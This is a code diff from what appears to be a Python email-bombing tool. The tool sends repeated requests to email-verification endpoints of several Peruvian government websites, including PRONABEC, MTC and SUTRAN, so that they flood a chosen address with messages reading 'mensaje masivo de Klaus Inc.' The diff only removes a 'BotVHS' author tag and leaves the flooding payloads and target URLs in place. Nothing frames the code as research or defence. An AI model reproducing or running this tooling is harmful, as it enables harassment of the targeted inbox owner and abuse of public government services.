@@ -38,7 +38,7 @@ else:
     cantidad = args.cantidad
 
 url1 = 'https://mesadepartes.pronabec.gob.pe/Registro/Verificacion_correo'
-payload1 = {"codigo": "999999", "correo": email, "nombre": "Esto es un mensaje masivo de Klaus Inc. desarrollado por BotVHS"}
+payload1 = {"codigo": "999999", "correo": email, "nombre": "Esto es un mensaje masivo de Klaus Inc."}
 headers1 = {"Content-Type": "application/json"}
 
 url2 = 'https://5c2aselbaend78.mtc.gob.pe/api/Account/validacionCorreoElectronicoweb'
@@ -49,7 +49,7 @@ url3 = 'https://tramidigital.regionlalibertad.gob.pe/Home/Verificar'
 payload3 = {"correo":email}
 
 url4 = 'https://webexterno.sutran.gob.pe/WebExterno/Pages/SolicitudAIP/TramiteGeneral.aspx/ValidaCorreo'
-payload4 = {"codVerif":"Atención, Esto es un mensaje masivo de Klaus Inc. desarrollado por BotVHS","correo":email,"nroDoc":"44444444"}
+payload4 = {"codVerif":"Atención, Esto es un mensaje masivo de Klaus Inc.","correo":email,"nroDoc":"44444444"}
 
 
 def make_request(url, payload, headers):
